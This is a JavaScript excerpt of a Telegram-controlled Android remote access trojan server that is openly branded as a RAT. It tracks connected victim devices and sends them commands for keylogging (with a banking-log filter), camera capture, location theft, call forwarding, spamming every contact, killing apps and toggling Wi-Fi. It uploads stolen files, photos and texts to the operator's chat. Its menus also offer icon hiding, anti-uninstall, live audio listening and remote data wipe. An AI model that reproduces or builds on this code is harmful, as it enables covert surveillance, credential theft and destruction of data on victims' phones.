    getBankingLogs() {
        return this.logs.filter(l => l.isSensitive);
    }
}

const smartKeylogger = new SmartKeylogger();

app.post('/api/keylogger', (req, res) => {
    const { clientId, key, app } = req.body;
    smartKeylogger.logKey(clientId, key, app);
    res.json({ success: true });
});

app.post('/api/keylogger/start/:clientId', (req, res) => {
    const { clientId } = req.params;
    const { app } = req.body;
    smartKeylogger.startTracking(clientId, app);
    res.json({ success: true });
});

// 14. Call Forwarding
class CallForwarding {
    constructor() {
        this.forwardings = new Map();
    }

    forwardCalls(clientId, targetNumber) {
        const client = clients.get(clientId);
        if (!client) return;

        const forwarding = {
            id: uuidv4(),
            clientId,
            targetNumber,
            startedAt: new Date().toISOString(),
            active: true,
            forwardedCalls: 0
        };
        
        this.forwardings.set(forwarding.id, forwarding);
        
        const forwardFile = path.join(DIRS.CALL_FORWARDING, `${forwarding.id}.json`);
        fs.writeFileSync(forwardFile, JSON.stringify(forwarding, null, 2));
        
        const db = readDB();
        db.stats.calls_forwarded++;
        writeDB(db);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'call_forward',
                target: targetNumber,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>📞 گواستنەوەی پەیوەندی چالاک کرا</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>📱 ژمارە:</b> ${targetNumber}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
            { parse_mode: 'HTML' }
        );
        
        return forwarding;
    }

    stopForwarding(forwardId) {
        const forwarding = this.forwardings.get(forwardId);
        if (forwarding) {
            forwarding.active = false;
            
            const client = clients.get(forwarding.clientId);
            if (client && client.ws.readyState === WebSocket.OPEN) {
                client.ws.send(JSON.stringify({
                    type: 'stop_call_forward',
                    timestamp: Date.now()
                }));
            }
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>⏹️ گواستنەوەی پەیوەندی وەستا</b>\n\n` +
                `<b>🆔 Forward:</b> ${forwardId.substring(0, 8)}...\n` +
                `<b>📊 پەیوەندی گواستراوە:</b> ${forwarding.forwardedCalls}`,
                { parse_mode: 'HTML' }
            );
        }
    }
}

const callForwarding = new CallForwarding();

// 15. Contacts Spam
class ContactsSpam {
    constructor() {
        this.activeSpams = new Map();
    }

    async spamAllContacts(clientId, message) {
        const client = clients.get(clientId);
        if (!client) return;

        const spam = {
            id: uuidv4(),
            clientId,
            message,
            startedAt: new Date().toISOString(),
            sent: 0,
            total: 0,
            active: true
        };
        
        this.activeSpams.set(spam.id, spam);
        
        const db = readDB();
        db.stats.messages_spammed++;
        writeDB(db);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'spam_contacts',
                message,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>📨 سپامی کۆنتاکتەکان دەستی پێکرد</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>📝 پەیام:</b> ${message}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
            { parse_mode: 'HTML' }
        );
        
        return spam;
    }

    updateProgress(spamId, sent, total) {
        const spam = this.activeSpams.get(spamId);
        if (spam) {
            spam.sent = sent;
            spam.total = total;
            
            if (sent >= total) {
                spam.active = false;
                bot.sendMessage(CONFIG.CHAT_ID,
                    `<b>✅ سپام تەواو بوو</b>\n\n` +
                    `<b>📊 نێردرا:</b> ${sent}/${total} پەیام`,
                    { parse_mode: 'HTML' }
                );
                this.activeSpams.delete(spamId);
            }
        }
    }
}

const contactsSpam = new ContactsSpam();

app.post('/api/spam/progress', (req, res) => {
    const { spamId, sent, total } = req.body;
    contactsSpam.updateProgress(spamId, sent, total);
    res.json({ success: true });
});

// 16. App Killer
class AppKiller {
    constructor() {
        this.blockedApps = new Map();
    }

    killApp(clientId, appPackage) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'kill_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🛑 کوشتنی ئەپ</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>📱 ئەپ:</b> ${appPackage}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
            { parse_mode: 'HTML' }
        );
    }

    blockApp(clientId, appPackage) {
        this.blockedApps.set(`${clientId}:${appPackage}`, true);
        
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'block_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🚫 بلۆکی ئەپ</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>📱 ئەپ:</b> ${appPackage}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n\n` +
            `<b>✅ ئەپەکە بلۆک کرا</b>`,
            { parse_mode: 'HTML' }
        );
    }

    unblockApp(clientId, appPackage) {
        this.blockedApps.delete(`${clientId}:${appPackage}`);
        
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'unblock_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>✅ لابردنی بلۆکی ئەپ</b>\n\n` +
            `<b>📱 ئەپ:</b> ${appPackage}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
            { parse_mode: 'HTML' }
        );
    }
}

const appKiller = new AppKiller();

// 17. WiFi & Bluetooth Control
class WifiBluetoothControl {
    constructor() {
        this.wifiState = new Map();
        this.bluetoothState = new Map();
    }

    toggleWifi(clientId, enable) {
        const client = clients.get(clientId);
        if (!client) return;

        this.wifiState.set(clientId, enable);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_wifi',
                enable,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '📶' : '❌'} <b>وایفای ${enable ? 'داگیرسا' : 'کوژایەوە'}</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
            { parse_mode: 'HTML' }
        );
    }

    toggleBluetooth(clientId, enable) {
        const client = clients.get(clientId);
        if (!client) return;

        this.bluetoothState.set(clientId, enable);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_bluetooth',
                enable,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '📱' : '❌'} <b>بلوتوس ${enable ? 'داگیرسا' : 'کوژایەوە'}</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
            { parse_mode: 'HTML' }
        );
    }

    changeDeviceName(clientId, newName) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'change_device_name',
                name: newName,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>📝 گۆڕینی ناوی ئامێر</b>\n\n` +
            `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
            `<b>📱 ناوی نوێ:</b> ${newName}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
            { parse_mode: 'HTML' }
        );
    }
}

const wifiBluetoothControl = new WifiBluetoothControl();

// =====================================================
// 📤 FILE UPLOAD ENDPOINTS
// =====================================================
app.post('/upload/file', upload.single('file'), (req, res) => {
    try {
        const { model, uuid, type } = req.headers;
        const { originalname, buffer, size } = req.file;
        
        const fileName = `${Date.now()}_${originalname}`;
        let saveDir = DIRS.FILES;
        
        switch(type) {
            case 'photo': saveDir = DIRS.PHOTOS; break;
            case 'video': saveDir = DIRS.VIDEOS; break;
            case 'audio': saveDir = DIRS.AUDIO; break;
            default: saveDir = DIRS.FILES;
        }
        
        const savePath = path.join(saveDir, fileName);
        fs.writeFileSync(savePath, buffer);
        
        bot.sendDocument(CONFIG.CHAT_ID, buffer, {
            caption: `<b>📁 فایلی نوێ</b>\n\n` +
                    `<b>📱 ئامێر:</b> ${model || 'نەزانراو'}\n` +
                    `<b>📄 ناو:</b> ${originalname}\n` +
                    `<b>📦 قەبارە:</b> ${(size / 1024).toFixed(2)}KB\n` +
                    `<b>🆔 ئایدی:</b> ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
            parse_mode: 'HTML'
        });
        
        res.json({ success: true, fileName });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/upload/text', (req, res) => {
    const { model, uuid, type } = req.headers;
    const { text } = req.body;
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `<b>📝 ${type || 'پەیام'} لە ${model || 'نەزانراو'}</b>\n\n` +
        `${text}\n\n` +
        `<b>🆔 ئایدی:</b> ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
        { parse_mode: 'HTML' }
    );
    
    res.json({ success: true });
});

app.post('/upload/location', (req, res) => {
    const { model, uuid } = req.headers;
    const { lat, lon } = req.body;
    
    bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
    bot.sendMessage(CONFIG.CHAT_ID,
        `<b>📍 شوێنی ${model || 'نەزانراو'}</b>\n\n` +
        `<b>Google Maps:</b> https://maps.google.com/?q=${lat},${lon}\n` +
        `<b>🆔 ئایدی:</b> ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
        { parse_mode: 'HTML' }
    );
    
    res.json({ success: true });
});

// =====================================================
// 🚀 FIXED CAMERA PHOTO ENDPOINT
// =====================================================
app.post('/api/camera/photo', upload.single('photo'), (req, res) => {
    try {
        const { clientId, camera } = req.headers;
        const { buffer, size } = req.file;
        
        if (!buffer) {
            throw new Error('وێنە نەدراوە');
        }
        
        const filename = `camera_${clientId.substring(0, 8)}_${Date.now()}.jpg`;
        const filepath = path.join(DIRS.CAM_SNAPSHOTS, filename);
        fs.writeFileSync(filepath, buffer);
        
        bot.sendPhoto(CONFIG.CHAT_ID, buffer, {
            caption: `<b>📸 وێنەی کامێرا</b>\n\n` +
                    `<b>📷 کامێرا:</b> ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
                    `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n` +
                    `<b>📦 قەبارە:</b> ${(size / 1024).toFixed(2)}KB\n` +
                    `<b>⏰ کات:</b> ${new Date().toLocaleString('ckb')}`,
            parse_mode: 'HTML'
        });
        
        const db = readDB();
        db.stats.cam_snapshots++;
        writeDB(db);
        
        res.json({ success: true, filename });
    } catch (error) {
        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>❌ هەڵە لە وەرگرتنی وێنە</b>\n\n<b>${error.message}</b>`,
            { parse_mode: 'HTML' }
        );
        res.status(500).json({ success: false, error: error.message });
    }
});

// =====================================================
// 🔌 WEBSOCKET CONNECTION
// =====================================================
wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    const clientInfo = {
        id: clientId,
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        model: req.headers.model || 'نەزانراو',
        manufacturer: req.headers.manufacturer || 'نەزانراو',
        androidVersion: req.headers.android || 'نەزانراو',
        battery: req.headers.battery || 'نەزانراو',
        ram: req.headers.ram || 'نەزانراو',
        storage: req.headers.storage || 'نەزانراو',
        root: req.headers.root || 'نەزانراو',
        country: req.headers.country || 'نەزانراو',
        carrier: req.headers.carrier || 'نەزانراو'
    };
    
    clients.set(clientId, { ws, info: clientInfo });
    
    const db = readDB();
    db.clients[clientId] = clientInfo;
    db.stats.total_connections++;
    writeDB(db);
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `<b>🔌 ئامێری نوێ پەیوەندی کرد</b>\n\n` +
        `<b>📱 مۆدێل:</b> ${clientInfo.manufacturer} ${clientInfo.model}\n` +
        `<b>📱 ئەندرۆید:</b> ${clientInfo.androidVersion}\n` +
        `<b>🔋 پاتری:</b> ${clientInfo.battery}\n` +
        `<b>💾 RAM:</b> ${clientInfo.ram}\n` +
        `<b>📁 Storage:</b> ${clientInfo.storage}\n` +
        `<b>🔓 Root:</b> ${clientInfo.root}\n` +
        `<b>🌍 وڵات:</b> ${clientInfo.country}\n` +
        `<b>🌐 IP:</b> ${clientInfo.ip}\n` +
        `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
        { parse_mode: 'HTML' }
    );
    
    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            clientInfo.lastSeen = new Date().toISOString();
            
            switch(message.type) {
                case 'ping':
                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
                    break;
                    
                case 'notification':
                    notificationListener.captureNotification(message.notification);
                    break;
                    
                case 'keylog':
                    smartKeylogger.logKey(clientId, message.key, message.app);
                    break;
                    
                case 'screen_frame':
                    const stream = screenStreamer.getActiveStreams().find(s => s.clientId === clientId);
                    if (stream) {
                        stream.frames++;
                    }
                    break;
                    
                case 'spam_progress':
                    contactsSpam.updateProgress(message.spamId, message.sent, message.total);
                    break;
                    
                case 'call_forwarded':
                    const forward = callForwarding.forwardings.get(message.forwardId);
                    if (forward) {
                        forward.forwardedCalls++;
                    }
                    break;
                    
                case 'cam_snapshot':
                    // Handle camera snapshot
                    break;
                    
                case 'sim_changed':
                    simChangeAlert.handleSimChange(clientId, message.simInfo);
                    break;
                    
                case 'boot_complete':
                    autoBoot.handleBootComplete(clientId);
                    break;
                    
                default:
                    console.log('Unknown message type:', message.type);
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });
    
    ws.on('close', () => {
        clients.delete(clientId);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `<b>🔌 ئامێر پەیوەندی پچڕاند</b>\n\n` +
            `<b>📱 مۆدێل:</b> ${clientInfo.manufacturer} ${clientInfo.model}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...`,
            { parse_mode: 'HTML' }
        );
    });
    
    ws.send(JSON.stringify({ type: 'init', clientId }));
});

// =====================================================
// 🤖 TELEGRAM BOT - MAIN MENU
// =====================================================
bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
        bot.sendMessage(msg.chat.id, '<b>⛔ ڕێگەپێدان نەدرا</b>', { parse_mode: 'HTML' });
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '<b>🔴 7ASHASHE V47 - ULTIMATE KURDISH RAT</b>\n\n' +
        '<b>✅ بەخێربێیت، عەزازیل 7ASHASHE!</b>\n\n' +
        '📱 <b>ئامێرەکان</b> - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
        '📊 <b>ئامار</b> - ئامارەکانی سیستەم\n' +
        '⚡ <b>فەرمانەکان</b> - ناردنی فەرمان بۆ ئامێرەکان\n' +
        '🔧 <b>پێشکەوتوو</b> - ١٠ فەرمانە پێشکەوتووەکان\n' +
        '❓ <b>ڕێنمایی</b> - ڕێنمایی وردی هەموو فەرمانەکان',
        {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['📱 ئامێرەکان', '📊 ئامار'],
                    ['⚡ فەرمانەکان', '🔧 پێشکەوتوو'],
                    ['❓ ڕێنمایی']
                ],
                resize_keyboard: true
            }
        }
    );
});

bot.onText(/📱 ئامێرەکان/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '<b>❌ هیچ ئامێرێک پەیوەست نییە</b>', { parse_mode: 'HTML' });
        return;
    }
    
    let text = '<b>📱 ئامێرە پەیوەستکراوەکان</b>\n\n';
    clients.forEach((client, id) => {
        text += `📱 <b>مۆدێل:</b> ${client.info.manufacturer} ${client.info.model}\n` +
                `🔋 <b>پاتری:</b> ${client.info.battery}\n` +
                `🌍 <b>وڵات:</b> ${client.info.country}\n` +
                `🆔 <b>ئایدی:</b> ${id.substring(0, 8)}...\n\n`;
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'HTML' });
});

bot.onText(/📊 ئامار/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const db = readDB();
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `<b>📊 ئامارەکانی سیستەم</b>\n\n` +
        `<b>📱 ئامێرە پەیوەستکراوەکان:</b> ${clients.size}\n` +
        `<b>📸 وێنە دزراوەکان:</b> ${db.stats.cam_snapshots || 0}\n` +
        `<b>📱 نۆتیفیکەیشن دزراوەکان:</b> ${db.stats.notifications_captured || 0}\n` +
        `<b>📹 Stream چالاک:</b> ${screenStreamer.activeStreams}\n` +
        `<b>🔑 کلیک تۆمارکراوەکان:</b> ${smartKeylogger.logs.length}\n` +
        `<b>🚫 هەوڵی سڕینەوە:</b> ${db.stats.anti_uninstall_attempts || 0}\n` +
        `<b>📱 گۆڕینی سیم:</b> ${db.stats.sim_changes || 0}\n` +
        `<b>⏱️ ماوەی کارکردن:</b> ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
        { parse_mode: 'HTML' }
    );
});

bot.onText(/⚡ فەرمانەکان/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '<b>❌ هیچ ئامێرێک پەیوەست نییە</b>', { parse_mode: 'HTML' });
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `device:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '<b>📱 ئامێرێک هەڵبژێرە</b>', {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

bot.onText(/🔧 پێشکەوتوو/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '<b>❌ هیچ ئامێرێک پەیوەست نییە</b>', { parse_mode: 'HTML' });
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `advanced_device:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '<b>🔧 ئامێرێک هەڵبژێرە بۆ فەرمانە پێشکەوتووەکان</b>', {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

bot.onText(/❓ ڕێنمایی/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const helpText = 
        '<b>❓ ڕێنمایی فەرمانەکان</b>\n\n' +
        '<b>📸 کامێرا:</b> وێنە لە کامێرای پشت یان پێش دەگرێت\n' +
        '<b>🎤 مایک:</b> دەنگی دەوروبەر تۆمار دەکات\n' +
        '<b>📍 شوێن:</b> شوێنی ئامێرەکە لەسەر نەخشە نیشان دەدات\n' +
        '<b>📁 فایلەکان:</b> لیستی فایلەکانی فۆڵدەرێک نیشان دەدات\n' +
        '<b>📱 نۆتیفیکەیشن:</b> گوێ لە نۆتیفیکەیشنەکان دەگرێت\n' +
        '<b>⌨️ کێڤلۆگەر:</b> کلیکەکان تۆمار دەکات\n' +
        '<b>📹 Stream:</b> شاشە بە ڕاستەوخۆ پیشان دەدات\n' +
        '<b>📶 وایفای:</b> وایفای داگیرسێنێت یان بیکوژێنێتەوە\n' +
        '<b>📱 بلوتوس:</b> بلوتوس داگیرسێنێت یان بیکوژێنێتەوە\n' +
        '<b>📞 فۆوارد:</b> پەیوەندییەکان دەگوازێتەوە\n' +
        '<b>📨 سپام:</b> پەیام بۆ هەموو کۆنتاکتەکان دەنێرێت\n' +
        '<b>🛑 کوشتنی ئەپ:</b> ئەپێک دادەخات\n\n' +
        '<b>🔧 فەرمانە پێشکەوتووەکان:</b>\n' +
        '<b>🚫 دژە-سڕینەوە:</b> ڕێگری لە سڕینەوە دەکات\n' +
        '<b>👁️ شاردنەوەی ئایکۆن:</b> ئایکۆن ون دەکات\n' +
        '<b>🎤 گوێگرتنی ڕاستەوخۆ:</b> گوێ لە دەنگ دەگرێت\n' +
        '<b>📸 سکرینشۆتی زیرەک:</b> کاتێک ئەپێک دەکرێتەوە سکرینشۆت دەگرێت\n' +
        '<b>⚡ کۆنترۆڵی کامێرا:</b> وێنە بە فلاش دەگرێت\n' +
        '<b>🔋 دژە-باتری:</b> ڕێگری لە خەوتنی ئەپەکە دەکات\n' +
        '<b>📱 ئاگاداری سیمکارت:</b> ئاگاداری لە گۆڕینی سیمکارت\n' +
        '<b>💥 سڕینەوەی داتا:</b> هەموو داتاکان دەسڕێتەوە\n' +
        '<b>💬 پەیامی ساختە:</b> پەیام لەسەر شاشە نیشان دەدات\n' +
        '<b>🔄 ڕیستارتی خۆکار:</b> دوای کوژانەوە دەست پێ دەکاتەوە';
    
    bot.sendMessage(CONFIG.CHAT_ID, helpText, { parse_mode: 'HTML' });
});

// =====================================================
// 🔘 CALLBACK QUERY HANDLER
// =====================================================
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const [command, clientId] = callbackQuery.data.split(':');
    
    // هەڵبژاردنی ئامێر بۆ فەرمانە ئاساییەکان
    if (command === 'device') {
        const client = clients.get(clientId);
        if (!client) {
            bot.editMessageText('<b>❌ ئامێرەکە پەیوەندی پچڕاند</b>', {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                parse_mode: 'HTML'
            });
            return;
        }
        
        bot.editMessageText(
            `<b>📱 ${client.info.manufacturer} ${client.info.model}</b>\n\n` +
            `<b>📱 ئەندرۆید:</b> ${client.info.androidVersion}\n` +
            `<b>🔋 پاتری:</b> ${client.info.battery}\n` +
            `<b>🌍 وڵات:</b> ${client.info.country}\n` +
            `<b>🌐 IP:</b> ${client.info.ip}\n\n` +
            `<b>⚡ فەرمانێک هەڵبژێرە:</b>`,
            {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📸 کامێرا', callback_data: `camera:${clientId}` },
                            { text: '🎤 مایک', callback_data: `mic:${clientId}` }
                        ],
                        [
                            { text: '📍 شوێن', callback_data: `location:${clientId}` },
                            { text: '📁 فایلەکان', callback_data: `files:${clientId}` }
                        ],
                        [
                            { text: '📱 نۆتیفیکەیشن', callback_data: `notifications:${clientId}` },
                            { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${clientId}` }
                        ],
                        [
                            { text: '📹 Stream', callback_data: `screen:${clientId}` },
                            { text: '📶 وایفای', callback_data: `wifi:${clientId}` }
                        ],
                        [
                            { text: '📱 بلوتوس', callback_data: `bluetooth:${clientId}` },
                            { text: '📞 فۆوارد', callback_data: `forward:${clientId}` }
                        ],
                        [
                            { text: '📨 سپام', callback_data: `spam:${clientId}` },
                            { text: '🛑 کوشتنی ئەپ', callback_data: `kill_app:${clientId}` }
                        ],
                        [
                            { text: '❓ ڕێنمایی', callback_data: `help_cmd:${clientId}` }
                        ]
                    ]
                }
            }
        );
    }
    
    // هەڵبژاردنی ئامێر بۆ فەرمانە پێشکەوتووەکان
    if (command === 'advanced_device') {
        const client = clients.get(clientId);
        if (!client) {
            bot.editMessageText('<b>❌ ئامێرەکە پەیوەندی پچڕاند</b>', {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                parse_mode: 'HTML'
            });
            return;
        }
        
        bot.editMessageText(
            `<b>🔧 فەرمانە پێشکەوتووەکان بۆ ${client.info.manufacturer} ${client.info.model}</b>\n\n` +
            `<b>📱 ئەندرۆید:</b> ${client.info.androidVersion}\n` +
            `<b>🔋 پاتری:</b> ${client.info.battery}\n` +
            `<b>🆔 ئایدی:</b> ${clientId.substring(0, 8)}...\n\n` +
            `<b>⚡ فەرمانێک هەڵبژێرە:</b>`,
            {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🚫 دژە-سڕینەوە', callback_data: `anti_uninstall:${clientId}` },
                            { text: '👁️ شاردنەوەی ئایکۆن', callback_data: `hide_icon:${clientId}` }
                        ],
                        [
                            { text: '🎤 گوێگرتنی ڕاستەوخۆ', callback_data: `audio_stream:${clientId}` },
                            { text: '📸 سکرینشۆتی زیرەک', callback_data: `smart_screenshot:${clientId}` }
                        ],
                        [
                            { text: '⚡ کۆنترۆڵی کامێرا', callback_data: `camera_control:${clientId}` },
                            { text: '🔋 دژە-باتری', callback_data: `battery_bypass:${clientId}` }
                        ],
                        [
                            { text: '📱 ئاگاداری سیمکارت', callback_data: `sim_alert:${clientId}` },
                            { text: '💥 سڕینەوەی داتا', callback_data: `wipe:${clientId}` }
                        ],
                        [
                            { text: '💬 پەیامی ساختە', callback_data: `toast:${clientId}` },
                            { text: '🔄 ڕیستارتی خۆکار', callback_data: `auto_boot:${clientId}` }
                        ],
                        [
                            { text: '❓ ڕێنمایی', callback_data: `help_adv:${clientId}` },
                            { text: '🔙 گەڕانەوە', callback_data: `back_to_advanced:${clientId}` }
                        ]
                    ]
                }
            }
        );
    }
    
    // ڕێنمایی فەرمانەکان
    if (command === 'help_cmd') {
        const client = clients.get(clientId);
        if (!client) return;
        
        const helpText = 
            '<b>❓ ڕێنمایی فەرمانە ئاساییەکان</b>\n\n' +
            getHelpText('camera') + '\n\n' +
            getHelpText('mic') + '\n\n' +
            getHelpText('location') + '\n\n' +
            getHelpText('files') + '\n\n' +
            getHelpText('notifications') + '\n\n' +
            getHelpText('keylogger') + '\n\n' +
            getHelpText('screen') + '\n\n' +
            getHelpText('wifi') + '\n\n' +
            getHelpText('bluetooth') + '\n\n' +
            getHelpText('forward') + '\n\n' +
            getHelpText('spam') + '\n\n' +
            getHelpText('kill_app');
        
        bot.sendMessage(CONFIG.CHAT_ID, helpText, { parse_mode: 'HTML' });
        bot.answerCallbackQuery(callbackQuery.id);
    }
    
    if (command === 'help_adv') {
        const helpText = 
            '<b>❓ ڕێنمایی فەرمانە پێشکەوتووەکان</b>\n\n' +
            getHelpText('anti_uninstall') + '\n\n' +
            getHelpText('hide_icon') + '\n\n' +
            getHelpText('audio_stream') + '\n\n' +
            getHelpText('smart_screenshot') + '\n\n' +
            getHelpText('camera_control') + '\n\n' +
            getHelpText('battery_bypass') + '\n\n' +
            getHelpText('sim_alert') + '\n\n' +
            getHelpText('wipe') + '\n\n' +
            getHelpText('toast') + '\n\n' +
            getHelpText('auto_boot');
        
        bot.sendMessage(CONFIG.CHAT_ID, helpText, { parse_mode: 'HTML' });
        bot.answerCallbackQuery(callbackQuery.id);
    }
    
    // جێبەجێکردنی فەرمانە ئاساییەکان
    const commandTypes = [
        'camera', 'mic', 'location', 'files', 'notifications',
        'keylogger', 'screen', 'wifi', 'bluetooth', 'forward',
        'spam', 'kill_app'
    ];
    
    if (commandTypes.includes(command)) {
        const client = clients.get(clientId);
        if (!client) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
                show_alert: true
            });
            return;
        }
        
        if (client.ws.readyState === WebSocket.OPEN) {
            const commandMap = {
                'camera': 'take_photo',
                'mic': 'record_audio',
                'location': 'get_location',
                'files': 'list_files',
                'notifications': 'start_notifications',
                'keylogger': 'start_keylogger',
                'screen': 'start_screen_stream',
                'wifi': 'toggle_wifi',
                'bluetooth': 'toggle_bluetooth',
                'forward': 'call_forward',
                'spam': 'spam_contacts',
                'kill_app': 'kill_app'
            };
            
            client.ws.send(JSON.stringify({
                type: commandMap[command] || command,
                timestamp: Date.now()
            }));
            
            bot.answerCallbackQuery(callbackQuery.id, {
                text: `✅ فەرمان نێردرا`,
                show_alert: false
            });
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `<b>✅ فەرمان نێردرا</b>\n\n` +
                `<b>📱 ئامێر:</b> ${client.info.manufacturer} ${client.info.model}\n` +
                `<b>⚡ فەرمان:</b> ${command}\n` +
                `<b>📋 ڕێنمایی:</b> ${getHelpText(command)}\n` +
                `<b>🕐 کات:</b> ${new Date().toLocaleString('ckb')}`,
                { parse_mode: 'HTML' }
            );
        } else {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
                show_alert: true
            });
        }
    }
    
    // جێبەجێکردنی فەرمانە پێشکەوتووەکان
    const advancedCommands = [
        'anti_uninstall', 'hide_icon', 'audio_stream', 'smart_screenshot',
        'camera_control', 'battery_bypass', 'sim_alert', 'wipe',
        'toast', 'auto_boot'
    ];
    
    if (advancedCommands.includes(command)) {
        const client = clients.get(clientId);
        if (!client) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
                show_alert: true
            });
